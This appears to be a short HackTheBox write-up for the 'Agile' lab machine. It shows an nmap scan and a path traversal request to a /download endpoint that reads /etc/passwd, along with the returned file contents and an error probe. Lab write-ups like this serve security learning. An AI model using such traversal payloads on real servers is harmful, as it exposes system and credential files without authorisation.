# [Agile](https://app.hackthebox.com/machines/532)

## Overview

- Linux machine
- Medium

## ip

target: 10.129.74.18

attacker: 10.10.14.5

## Scan

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -Pn -v 10.129.74.18 
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f4bcee21d71f1aa26572212d5ba6f700 (ECDSA)
|_  256 65c1480d88cbb975a02ca5e6377e5106 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://superpass.htb
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## path traversal

endpoint: `/download`

poc:

```http
GET /download?fn=../etc/passwd HTTP/1.1

HTTP/1.1 200 OK

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
```

error message when set fn to not exist file name:

```http
GET /download?fn=../asdf HTTP/1.1

HTTP/1.1 500 INTERNAL SERVER ERROR
Server: nginx/1.18.0 (Ubuntu)

...
```

- python 3.10
- flask
- source: [source](./leak_superpass/)
